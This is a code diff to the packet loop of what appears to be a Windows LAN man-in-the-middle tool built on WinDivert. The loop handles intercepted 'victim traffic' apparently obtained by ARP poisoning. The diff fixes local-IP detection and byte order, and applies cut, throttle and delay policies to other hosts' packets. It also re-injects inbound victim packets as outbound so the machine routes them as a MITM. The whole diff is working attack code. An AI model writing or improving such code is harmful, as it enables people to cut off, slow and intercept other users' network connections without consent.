@@ -92,83 +92,86 @@ void ShaperEngine::processingLoop() {
     while (m_running) {
         if (!WinDivertRecv(m_handle, packet, sizeof(packet), &packetLen, &addr)) continue;
 
-        // FAST PATH: If no policies are active, forward immediately
-        // This avoids ALL string parsing overhead when just poisoning for monitoring
-        {
-            std::lock_guard<std::mutex> lock(m_policyMutex);
-            if (m_policies.empty()) {
-                WinDivertSend(m_handle, packet, packetLen, nullptr, &addr);
-                continue;
-            }
-        }
-
         PWINDIVERT_IPHDR ipHdr = nullptr;
         WinDivertHelperParsePacket(packet, packetLen, &ipHdr, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr);
         
         bool shouldForward = true;
+        bool isMine = true;  // default: assume it's ours, so we never accidentally drop our own traffic
 
         if (ipHdr) {
-            char src[16], dst[16];
-            WinDivertHelperFormatIPv4Address(ipHdr->SrcAddr, src, sizeof(src));
-            WinDivertHelperFormatIPv4Address(ipHdr->DstAddr, dst, sizeof(dst));
+            // WinDivert IPHDR fields are in NETWORK byte order (raw packet).
+            // FormatIPv4Address expects HOST byte order. Must convert.
+            UINT32 srcHost = ntohl(ipHdr->SrcAddr);
+            UINT32 dstHost = ntohl(ipHdr->DstAddr);
 
-            std::string srcStr(src);
-            std::string dstStr(dst);
+            // m_localIpNet is stored via inet_pton = NETWORK byte order
+            // Convert it to host for comparison
+            UINT32 localHost = ntohl(m_localIpNet);
 
-            std::lock_guard<std::mutex> lock(m_policyMutex);
-
-            // CRITICAL: Never apply policies to our own machine's traffic
-            bool isMine = (!m_localIp.empty()) && 
-                          (srcStr == m_localIp || dstStr == m_localIp);
+            isMine = (localHost != 0) && (srcHost == localHost || dstHost == localHost);
 
             if (!isMine) {
-                // This is intercepted victim traffic — apply policies
-                TrafficMode activeMode = TrafficMode::NORMAL;
-                int activeDelay = 0;
-                std::string policyIp;
+                // This is intercepted victim traffic — check policies
+                std::lock_guard<std::mutex> lock(m_policyMutex);
+                if (!m_policies.empty()) {
+                    char src[16], dst[16];
+                    WinDivertHelperFormatIPv4Address(srcHost, src, sizeof(src));
+                    WinDivertHelperFormatIPv4Address(dstHost, dst, sizeof(dst));
+                    std::string srcStr(src);
+                    std::string dstStr(dst);
 
-                auto srcIt = m_policies.find(srcStr);
-                if (srcIt != m_policies.end()) {
-                    activeMode = srcIt->second.mode;
-                    activeDelay = srcIt->second.delayMs;
-                    policyIp = srcStr;
-                }
-                auto dstIt = m_policies.find(dstStr);
-                if (dstIt != m_policies.end() && dstIt->second.mode > activeMode) {
-                    activeMode = dstIt->second.mode;
-                    activeDelay = dstIt->second.delayMs;
-                    policyIp = dstStr;
-                }
+                    TrafficMode activeMode = TrafficMode::NORMAL;
+                    int activeDelay = 0;
+                    std::string policyIp;
 
-                switch (activeMode) {
-                    case TrafficMode::CUT:
-                        shouldForward = false;
-                        break;
-                    case TrafficMode::THROTTLE:
-                        if (m_buckets.count(policyIp) && !m_buckets[policyIp].consume(packetLen)) {
+                    auto srcIt = m_policies.find(srcStr);
+                    if (srcIt != m_policies.end()) {
+                        activeMode = srcIt->second.mode;
+                        activeDelay = srcIt->second.delayMs;
+                        policyIp = srcStr;
+                    }
+                    auto dstIt = m_policies.find(dstStr);
+                    if (dstIt != m_policies.end() && dstIt->second.mode > activeMode) {
+                        activeMode = dstIt->second.mode;
+                        activeDelay = dstIt->second.delayMs;
+                        policyIp = dstStr;
+                    }
+
+                    switch (activeMode) {
+                        case TrafficMode::CUT:
                             shouldForward = false;
-                        }
-                        break;
-                    case TrafficMode::DELAY:
-                        if (activeDelay > 0) {
-                            DelayedPacket dp;
-                            dp.data.assign(packet, packet + packetLen);
-                            dp.addr = addr;
-                            dp.releaseTime = std::chrono::steady_clock::now() + std::chrono::milliseconds(activeDelay);
-                            {
-                                std::lock_guard<std::mutex> dlock(m_delayMutex);
-                                m_delayQueue.push_back(std::move(dp));
+                            break;
+                        case TrafficMode::THROTTLE:
+                            if (m_buckets.count(policyIp) && !m_buckets[policyIp].consume(packetLen)) {
+                                shouldForward = false;
                             }
-                            shouldForward = false;
-                        }
-                        break;
-                    default:
-                        break;
+                            break;
+                        case TrafficMode::DELAY:
+                            if (activeDelay > 0) {
+                                DelayedPacket dp;
+                                dp.data.assign(packet, packet + packetLen);
+                                dp.addr = addr;
+                                dp.releaseTime = std::chrono::steady_clock::now() + std::chrono::milliseconds(activeDelay);
+                                {
+                                    std::lock_guard<std::mutex> dlock(m_delayMutex);
+                                    m_delayQueue.push_back(std::move(dp));
+                                }
+                                shouldForward = false;
+                            }
+                            break;
+                        default:
+                            break;
+                    }
                 }
             }
         }
 
         if (shouldForward) {
+            if (!isMine && addr.Outbound == 0) {
+                // Re-inject intercepted inbound victim traffic as OUTBOUND
+                // so Windows routes it to the real destination (acts as MITM router)
+                addr.Outbound = 1;
+            }
             WinDivertSend(m_handle, packet, packetLen, nullptr, &addr);
         }
     }
